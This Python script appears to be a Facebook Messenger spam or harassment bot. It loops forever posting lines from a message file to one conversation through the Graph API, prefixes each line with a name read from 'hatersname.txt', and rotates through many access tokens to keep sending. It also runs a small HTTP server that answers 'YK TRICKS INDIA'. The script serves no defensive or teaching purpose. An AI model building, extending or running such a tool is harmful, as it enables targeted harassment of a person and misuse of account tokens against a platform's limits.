import requests
import time
import sys
import os
import http.server
import socketserver
import threading
from platform import system

# HTTP Server Handler
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"YK TRICKS INDIA")

# Function to Start HTTP Server
def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print(f"Server running at http://localhost:{PORT}")
        httpd.serve_forever()

# Function to Send Messages
def send_messages():
    try:
        # Read Password
        with open('password.txt', 'r') as file:
            stored_password = file.read().strip()

        entered_password = input("Enter Password: ").strip()
        if entered_password != stored_password:
            print("[-] Incorrect Password! Exiting.")
            sys.exit()

        # Read Access Tokens
        with open('token.txt', 'r') as file:
            tokens = [line.strip() for line in file.readlines()]
        num_tokens = len(tokens)

        # Read Conversation ID
        with open('convo.txt', 'r') as file:
            convo_id = file.read().strip()

        # Read Messages
        with open('file.txt', 'r') as file:
            text_file_path = file.read().strip()
        with open(text_file_path, 'r') as file:
            messages = [line.strip() for line in file.readlines()]
        num_messages = len(messages)

        # Read Additional Info
        with open('hatersname.txt', 'r') as file:
            haters_name = file.read().strip()
        with open('time.txt', 'r') as file:
            speed = int(file.read().strip())

        # API Headers
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mobile)',
            'Accept': 'application/json',
            'Connection': 'keep-alive'
        }

        # Sending Messages Loop
        while True:
            for i, message in enumerate(messages):
                token_index = i % num_tokens
                access_token = tokens[token_index]

                url = f"https://graph.facebook.com/v15.0/t_{convo_id}/messages"
                data = {
                    'access_token': access_token,
                    'message': f"{haters_name} {message}"
                }

                response = requests.post(url, json=data, headers=headers)
                timestamp = time.strftime("%Y-%m-%d %I:%M:%S %p")

                if response.ok:
                    print(f"[+] Message {i+1} sent successfully: {haters_name} {message}")
                else:
                    print(f"[x] Failed to send message {i+1}. Response: {response.text}")

                print(f"  - Time: {timestamp}")
                time.sleep(speed)

            print("\n[+] All messages sent. Restarting the process...\n")

    except Exception as e:
        print(f"[!] An error occurred: {e}")

# Main Function
def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()
    send_messages()

if __name__ == '__main__':
    main()
